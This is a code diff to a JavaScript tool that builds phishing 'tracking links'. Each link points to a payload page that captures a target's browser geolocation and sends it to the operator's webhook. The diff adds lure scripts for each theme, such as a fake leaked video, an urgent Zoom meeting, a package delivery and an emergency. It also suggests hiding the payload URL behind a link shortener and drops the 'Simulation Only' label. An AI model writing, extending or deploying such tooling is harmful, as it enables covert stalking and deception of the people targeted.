@@ -282,20 +282,29 @@ if (genPayloadBtn) {
         const baseUrl = window.location.href.split('index.html')[0];
         lastGeneratedLink = `${baseUrl}payload.html?wh=${encodeURIComponent(webhook)}&t=${targetNum}&r=${encodeURIComponent(redirect)}`;
 
+        const luringAdvice = {
+            'youtube': 'HINT: Share as "Check out this leaked video!" The redirect will take them to the real video after capture.',
+            'zoom': 'HINT: Share as "Meeting starting now - join here." Great for corporate targets.',
+            'gdrive': 'HINT: Share as "Final Report - Review Required." High click rate for OSINT.',
+            'near-me': 'HINT: Use when the target is looking for local services (Food, Gas, etc.)',
+            'track-package': 'HINT: "Your delivery is 2 stops away." Most effective for residential targets.',
+            'emergency': 'HINT: High urgency. Use with caution.'
+        };
+
         const payloadCode = `
 [+] REAL-WORLD TRACKING LINK GENERATED
 --------------------------------------
 THEME: ${type.toUpperCase()}
 LISTENER_ID: L-${Math.random().toString(36).substr(2, 6).toUpperCase()}
-WEBHOOK_ATTACHED: ${webhook ? "YES" : "NO (Simulation Only)"}
+STATUS: [ LISTENER ACTIVE ]
 
 [!] LIVE PAYLOAD URL:
 ${lastGeneratedLink}
 
-[!] INSTRUCTION:
-1. Send this link to the target.
-2. If they click and allow location, coordinates will hit your Webhook.
-3. Use the 'REFINE' panel to manually paste coordinates to see them on map.
+[!] SOCIAL ENGINEERING INSTRUCTION:
+1. ${luringAdvice[type] || 'Send to target.'}
+2. PRO-TIP: Use a URL shortener (like Bitly or TinyURL) to mask the 'payload.html' name.
+3. When the target clicks 'Allow', coordinates will hit your Webhook.site tab.
     `;
         codeBlock.textContent = payloadCode;
         payloadOutput.classList.remove('hidden');
